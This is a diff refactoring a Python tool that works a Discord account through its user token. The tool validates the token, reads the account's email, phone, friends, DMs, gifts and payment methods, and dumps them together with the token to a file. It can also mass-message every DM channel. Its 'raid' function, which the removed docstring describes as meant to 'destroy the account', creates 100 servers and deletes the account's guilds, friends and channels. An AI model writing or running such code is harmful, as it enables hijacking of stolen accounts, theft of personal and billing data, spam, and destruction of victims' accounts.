@@ -1,169 +1,154 @@
-import threading
-import colorama
-import requests
+from threading import Thread
+from requests import Session
 import random
 import time
 import json
 
-colorama.init()
-CGREEN = colorama.Fore.GREEN
-CRED = colorama.Fore.RED
-CEND = colorama.Fore.RESET
+TOKEN = ""
 
 
-class DiscordApi:
+class Playground:
     def __init__(self, token):
         self.token = token
+        self.session = Session()
+        self.session.headers = {"authorization": self.token, "content-type": "application/json"}
+
+        self.api = "https://discord.com/api"
 
         self.username = None
         self.id = None
         self.email = None
         self.phone = None
 
-        self.HEADERS = {"authorization": self.token, "content-type": "application/json"}
-        self._validate()
+        self._check()
 
-    def _validate(self) -> None:
-        """This will check if the discord token works"""
-        url = f"https://discord.com/api/users/@me"
-        r = requests.get(url, headers=self.HEADERS)
+    def _check(self):
+        url = self.api + "/users/@me"
+        r = self.session.get(url)
+
         if r.status_code == 200:
-            print(CGREEN + f"Valid token: {self.token}" + CEND)
+            print(f"Valid token: {self.token}")
             data = r.json()
-            self.username = data['username'] + "#" + data['discriminator']
+            self.username = data['username']
             self.id = data['id']
             self.email = data['email']
             self.phone = data['phone']
         else:
-            print(CRED + f"Invalid token: {self.token}" + CEND)
+            print(f"Invalid token: {self.token}")
             exit()
 
-    def get_gifts(self) -> list:
-        """It will get all the gifts of the account"""
-        url = f"https://discord.com/api/v8/users/@me/entitlements/gifts"
-        r = requests.get(url, headers=self.HEADERS)
+    def get_gifts(self):
+        url = self.api + "/users/@me/entitlements/gifts"
+        r = self.session.get(url)
         return r.json() if r.status_code == 200 else []
 
-    def get_user_channels(self) -> list:
-        """It will get all the dm of the account"""
-        url = f"https://discordapp.com/api/users/@me/channels"
-        r = requests.get(url, headers=self.HEADERS)
+    def get_user_channels(self):
+        url = self.api + "/users/@me/channels"
+        r = self.session.get(url)
         return r.json() if r.status_code == 200 else []
 
-    def get_guilds(self) -> list:
-        """It will get all the servers of the account"""
-        url = "https://discord.com/api/users/@me/guilds"
-        r = requests.get(url, headers=self.HEADERS)
+    def get_guilds(self):
+        url = self.api + "/users/@me/guilds"
+        r = self.session.get(url)
         return r.json() if r.status_code == 200 else []
 
-    def get_friends(self) -> list:
-        """It will get all the friends of the account"""
-        url = "https://discord.com/api/users/@me/relationships"
-        r = requests.get(url, headers=self.HEADERS)
+    def get_friends(self):
+        url = self.api + "/users/@me/relationships"
+        r = self.session.get(url)
         return r.json() if r.status_code == 200 else []
 
-    def get_nitro(self) -> bool:
-        """It will check if the account has nitro"""
-        url = f"https://discord.com/api/users/{self.id}/profile"
-        r = requests.get(url, headers=self.HEADERS)
+    def get_nitro(self):
+        url = self.api + f"/users/{self.id}/profile"
+        r = self.session.get(url)
         try:
             return bool(r.json()['premium_since'])
         except KeyError('premium_since'):
             return False
 
-    def join_server(self, invite_code: str) -> None:
-        """It will join to a server"""
+    def join_server(self, invite_code):
         invite_code = invite_code.replace("https://discord.gg/", "")
-        url = f"https://discord.com/api/v9/invites/{invite_code}"
-        r = requests.post(url, headers=self.HEADERS)
+        url = self.api + f"/invites/{invite_code}"
+        r = self.session.post(url)
         if r.status_code in [200, 201, 204]:
-            print(CGREEN + f"{self.username} | Joined to {invite_code}" + CEND)
+            print(f"{self.username} | Joined to {invite_code}")
         else:
-            print(CRED + f"{self.username} | Error {r.text}" + CEND)
+            print(f"{self.username} | Error {r.text}")
 
-    def set_typing(self, channel_id: str, amount: int = 1) -> None:
-        """It will set typing mode on a channel"""
-        url = f"https://discord.com/api/channels/{channel_id}/typing"
+    def set_typing(self, channel_id, amount=1):
+        url = self.api + f"/channels/{channel_id}/typing"
         for _ in range(amount):
-            r = requests.post(url, headers=self.HEADERS, json={})
+            r = self.session.post(url, json={})
             if r.status_code in [200, 201, 204]:
-                print(CGREEN + f"{self.username} | Sent typing request" + CEND)
+                print(f"{self.username} | Sent typing request")
             else:
-                print(CRED + f"{self.username} | Error {r.text}" + CEND)
+                print(f"{self.username} | Error {r.text}")
 
-    def set_custom_status(self, status: str) -> None:
-        """It will set a new custom status"""
-        url = "https://discord.com/api/users/@me/settings"
-        status = {"custom_status": {"text": status}}
-        r = requests.patch(url, headers=self.HEADERS, json=status)
+    def set_custom_status(self, status):
+        url = self.api + "/users/@me/settings"
+        payload = {"custom_status": {"text": status}}
+        r = self.session.patch(url, json=payload)
         if r.status_code in [200, 201, 204]:
-            print(CGREEN + f"{self.username} | Status changed to: {status}" + CEND)
+            print(f"{self.username} | Status changed to: {status}")
         else:
-            print(CRED + f"{self.username} | Error: {r.text}" + CEND)
+            print(f"{self.username} | Error: {r.text}")
 
-    def set_bio(self, bio: str) -> None:
-        """It will set a new bio"""
-        url = "https://discord.com/api/v9/users/@me"
+    def set_bio(self, bio):
+        url = self.api + "/users/@me"
         payload = {"bio": bio}
-        r = requests.patch(url, headers=self.HEADERS, json=payload)
+        r = self.session.patch(url, json=payload)
         if r.status_code in [200, 201, 204]:
-            print(CGREEN + f"{self.username} | Bio changed to: {bio}" + CEND)
+            print(f"{self.username} | Bio changed to: {bio}")
         else:
-            print(CRED + f"{self.username} | Error: {r.text}" + CEND)
+            print(f"{self.username} | Error: {r.text}")
 
-    def change_theme(self, theme) -> None:
-        """For change the theme between dark and light"""
-        url = "https://discordapp.com/api/v8/users/@me/settings"
+    def change_theme(self, theme):
+        url = self.api + "/users/@me/settings"
         if theme in ["dark", "light"]:
-            r = requests.patch(url, headers=self.HEADERS, json={"theme": theme})
+            r = self.session.patch(url, json={"theme": theme})
             if r.status_code in [200, 201, 204]:
-                print(CGREEN + f"{self.username} | Theme changed to {theme}" + CEND)
+                print(f"{self.username} | Theme changed to {theme}")
             else:
-                print(CRED + f"{self.username} | Error: {r.text}" + CEND)
+                print(f"{self.username} | Error: {r.text}")
         else:
-            print(CRED + f"Invalid theme type, maybe you meant: 'dark' or 'light'" + CEND)
+            print(f"Invalid theme type, maybe you meant: 'dark' or 'light'")
 
-    def change_status(self, status: str) -> None:
-        """With this function you will be able to change your status"""
-        url = "https://discord.com/api/v9/users/@me/settings"
+    def change_status(self, status):
+        url = self.api + "/users/@me/settings"
         statuses = ["online", "idle", "dnd", "invisible"]
         if status in statuses:
             payload = {"status": status}
-            r = requests.patch(url, headers=self.HEADERS, json=payload)
+            r = self.session.patch(url, json=payload)
             if r.status_code in [200, 201, 204]:
-                print(CGREEN + f"{self.username} | Status changed to {status}" + CEND)
+                print(f"{self.username} | Status changed to {status}")
             else:
-                print(CRED + f"{self.username} | Error: {r.text}" + CEND)
+                print(f"{self.username} | Error: {r.text}")
         else:
-            print(CRED + f"Invalid status, maybe you meant: {statuses}" + CEND)
+            print(f"Invalid status, maybe you meant: {statuses}")
 
-    def change_language(self, language: str) -> None:
-        """For change the language"""
+    def change_language(self, language):
         languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                      "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
                      "el", "bg", "ru", "uk", "hi", "th", "zh-CN", "ja", "zh-TW", "ko"]
-        url = "https://discordapp.com/api/v8/users/@me/settings"
+        url = self.api + "/users/@me/settings"
         if language in languages:
-            r = requests.patch(url, headers=self.HEADERS, json={"locale": language})
+            r = self.session.patch(url, json={"locale": language})
             if r.status_code in [200, 201, 204]:
-                print(CGREEN + f"{self.username} | Language changed to {language}" + CEND)
+                print(f"{self.username} | Language changed to {language}")
             else:
-                print(CRED + f"{self.username} | Error: {r.text}" + CEND)
+                print(f"{self.username} | Error: {r.text}")
         else:
-            print(CRED + f"Invalid language, maybe you meant: {languages}" + CEND)
+            print(f"Invalid language, maybe you meant: {languages}")
 
-    def send_message(self, msg: str, channel_id: str) -> None:
-        """You can send a msg to whoever you want"""
-        url = f"https://discord.com/api/channels/{channel_id}/messages"
+    def send_message(self, msg, channel_id):
+        url = self.api + f"/channels/{channel_id}/messages"
         data = {"content": msg}
-        r = requests.post(url, headers=self.HEADERS, json=data)
+        r = self.session.post(url, json=data)
         if r.status_code == 200:
-            print(CGREEN + f"{self.username} | Message sent to {channel_id}" + CEND)
+            print(f"{self.username} | Message sent to {channel_id}")
         else:
-            print(CRED + f"{self.username} | Error {r.status_code}: {channel_id}" + CEND)
+            print(f"{self.username} | Error {r.status_code}: {channel_id}")
 
-    def send_mass_messages(self, msg: str) -> None:
-        """It will send a msg to all the channels"""
+    def send_mass_messages(self, msg):
         total = 0
         for channel in self.get_user_channels():
             self.send_message(msg, channel['id'])
@@ -171,25 +156,20 @@ class DiscordApi:
             time.sleep(1)
         print(f"{self.username} | Sent {total} messages")
 
-
-    def create_threads(self, channel: str, name: str, duration: int):
-        """It will create a thread"""
-        url = f"https://discord.com/api/channels/{channel}/threads"
+    def create_threads(self, channel, name, duration: int):
+        url = self.api + f"/channels/{channel}/threads"
         payload = {"name": name, "type": 11, "auto_archive_duration": duration}
-        r = requests.post(url, headers=self.HEADERS, json=payload)
+        r = self.session.post(url, json=payload)
         if r.status_code in [200, 201, 204]:
-            print(CGREEN + f"{self.username} | Created a thread at {channel}" + CEND)
+            print(f"{self.username} | Created a thread at {channel}")
         else:
-            print(CRED + f"{self.username} | Failed to create the thread at {channel}" + CEND)
+            print(f"{self.username} | Failed to create the thread at {channel}")
 
-
-
-    def raid(self) -> None:
-        """It will destroy the account"""
-        threading.Thread(target=self.create_guilds, args=["raided", 100]).start()
-        threading.Thread(target=self.delete_guilds).start()
-        threading.Thread(target=self.delete_friends).start()
-        threading.Thread(target=self.delete_channels).start()
+    def raid(self):
+        Thread(target=self.create_guilds, args=["raided", 100]).start()
+        Thread(target=self.delete_guilds).start()
+        Thread(target=self.delete_friends).start()
+        Thread(target=self.delete_channels).start()
         while True:
             languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                          "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
@@ -199,11 +179,10 @@ class DiscordApi:
                 theme = "dark" if i == 0 else "light"
                 self.change_theme(theme)
 
-    def get_payments(self) -> list:
-        """Checks if the account has payments methods"""
+    def get_payments(self):
         payment_types = ["Credit Card", "Paypal"]
-        url = "https://discord.com/api/users/@me/billing/payment-sources"
-        r = requests.get(url, headers=self.HEADERS)
+        url = self.api + "/users/@me/billing/payment-sources"
+        r = self.session.get(url)
         if r.status_code in [200, 201, 204]:
             payments = []
             for data in r.json():
@@ -232,88 +211,83 @@ class DiscordApi:
         else:
             return []
 
-    def get_messages(self, channel_id: str, page: int = 0) -> list:
-        """It will get 25 messages from a channel"""
+    def get_messages(self, channel_id, page: int = 0):
         offset = 25 * page
-        url = f"https://discord.com/api/channels/{channel_id}/messages/search?offset={offset}"
-        r = requests.get(url, headers=self.HEADERS)
+        url = self.api + f"/channels/{channel_id}/messages/search?offset={offset}"
+        r = self.session.get(url)
         if r.status_code in [200, 201, 204]:
             return r.json()["messages"]
         else:
             return []
 
-    def clear_messages(self, channel_id: str) -> None:
-        """It will delete messages from a channel"""
-        total_messages_url = f"https://discord.com/api/channels/{channel_id}/messages/search?author_id={self.id}"
-        total_messages = requests.get(total_messages_url, headers=self.HEADERS).json()["total_results"]
-        page = 0
-        total = 0
-        while total <= total_messages:
-            messages = self.get_messages(channel_id, page)
-            for message in messages:
-                if message[0]["author"]["id"] == self.id:
-                    url = f"https://discord.com/api/channels/{channel_id}/messages/{message[0]['id']}"
-                    r = requests.delete(url, headers=self.HEADERS)
-                    print(r.status_code, r.text)
-                    if r.status_code in [200, 201, 204]:
-                        print(CGREEN + f"{self.username} | Deleted message {message[0]['id']}" + CEND)
-                        time.sleep(2)
-                        total += 1
-                    else:
-                        print(r.status_code)
-                        print(r.text)
-            page += 1
-        print(CGREEN + f"{self.username} | Deleted {total} messages in {channel_id}" + CEND)
+    def clear_messages(self, channel_id):
+        # TODO: REDO
+        pass
+    #     total_messages_url = self.api + f"/channels/{channel_id}/messages/search?author_id={self.id}"
+    #     total_messages = self.session.get(total_messages_url).json()["total_results"]
+    #     page = 0
+    #     total = 0
+    #     while total <= total_messages:
+    #         messages = self.get_messages(channel_id, page)
+    #         for message in messages:
+    #             if message[0]["author"]["id"] == self.id:
+    #                 url = self.api + f"/channels/{channel_id}/messages/{message[0]['id']}"
+    #                 r = self.session.delete(url)
+    #                 print(r.status_code, r.text)
+    #                 if r.status_code in [200, 201, 204]:
+    #                     print(f"{self.username} | Deleted message {message[0]['id']}")
+    #                     time.sleep(2)
+    #                     total += 1
+    #                 else:
+    #                     print(r.status_code)
+    #                     print(r.text)
+    #         page += 1
+    #     print(f"{self.username} | Deleted {total} messages in {channel_id}")
 
-    def delete_friends(self) -> None:
-        """It will delete all the friends from the account"""
+    def delete_friends(self):
         total = 0
         for friend in self.get_friends():
-            url = f"https://discord.com/api/users/@me/relationships/{friend['id']}"
-            r = requests.delete(url, headers=self.HEADERS)
+            url = self.api + f"/users/@me/relationships/{friend['id']}"
+            r = self.session.delete(url)
             if r.status_code in [200, 201, 204]:
                 total += 1
         print(f"{self.username} | Deleted {total} friends")
 
-    def delete_guilds(self, exceptions: list = []) -> None:
-        """It will delete all the servers from the account"""
+    def delete_guilds(self, exceptions):
         total = 0
         for guild in self.get_guilds():
             if guild["id"] in exceptions:
                 continue
             if guild['owner']:
-                url = f"https://discord.com/api/guilds/{guild['id']}/delete"
-                r = requests.post(url, headers=self.HEADERS, json={})
+                url = self.api + f"/guilds/{guild['id']}/delete"
+                r = self.session.post(url, json={})
                 if r.status_code in [200, 201, 204]:
                     total += 1
             else:
-                url = f"https://discord.com/api/users/@me/guilds/{guild['id']}"
-                requests.delete(url, headers=self.HEADERS, json={})
+                url = self.api + "/users/@me/guilds/{guild['id']}"
+                self.session.delete(url, json={})
         print(f"{self.username} | Deleted {total} guilds")
 
-    def delete_channels(self) -> None:
-        """It will delete all the channels from the account"""
+    def delete_channels(self):
         total = 0
         for channel in self.get_user_channels():
-            url = f"https://discord.com/api/channels/{channel['id']}"
-            r = requests.delete(url, headers=self.HEADERS)
+            url = self.api + f"/channels/{channel['id']}"
+            r = self.session.delete(url)
             if r.status_code in [200, 201, 204]:
                 total += 1
         print(f"{self.username} | Deleted {total} channels")
 
-    def create_guilds(self, name: str, amount: int) -> None:
-        """To create all the servers you want"""
-        url = "https://discord.com/api/v9/guilds"
+    def create_guilds(self, name, amount: int):
+        url = self.api + "/guilds"
         payload = {"name": name}
         total = 0
         for i in range(amount):
-            r = requests.post(url, headers=self.HEADERS, json=payload)
+            r = self.session.post(url, json=payload)
             if r.status_code in [200, 201, 204]:
                 total += 1
         print(f"{self.username} | created {total} servers")
 
-    def dump_info(self, extra_info: bool = False) -> None:
-        """It will create a file with all the info about the account"""
+    def dump_info(self, extra_info: bool = False):
         info = {
             "token": self.token,
             "username": self.username,
@@ -332,23 +306,24 @@ class DiscordApi:
 
         with open(f"{self.username}.json", "w") as f:
             json.dump(info, f, indent=4)
-        print(CGREEN + "Info dumped" + CEND)
+        print("Info dumped")
 
 
-user = DiscordApi(token="")
-# user.dump_info(extra_info=True)
-# user.set_typing(channel_id="Channel")
-# user.send_message(msg=":neutral_face:", channel_id="831933264649519136")
-# user.send_mass_messages(msg="Msg")
-# user.set_bio(bio="New Bio")
-# user.set_custom_status(status="New status")
-# user.change_status()
-# user.change_language(language="Lang")
-# user.change_theme(theme="dark or light")
-# user.create_threads(channel="Channel", name="Name", duration=1400)
-# user.create_guilds(name="UwU", amount=100)
-# user.clear_messages(channel_id="Channel")
-# user.delete_guilds()
-# user.delete_channels()
-# user.delete_friends()
-# user.raid()
+if __name__ == '__main__':
+    user = Playground(TOKEN)
+    # user.dump_info(extra_info=True)
+    # user.set_typing(channel_id="Channel")
+    # user.send_message(msg=":neutral_face:", channel_id="831933264649519136")
+    # user.send_mass_messages(msg="Msg")
+    # user.set_bio(bio="New Bio")
+    # user.set_custom_status(status="New status")
+    # user.change_status()
+    # user.change_language(language="Lang")
+    # user.change_theme(theme="dark")
+    # user.create_threads(channel="Channel", name="Name", duration=1400)
+    # user.create_guilds(name="UwU", amount=100)
+    # user.clear_messages(channel_id="914598955545952328")
+    # user.delete_guilds()
+    # user.delete_channels()
+    # user.delete_friends()
+    # user.raid()
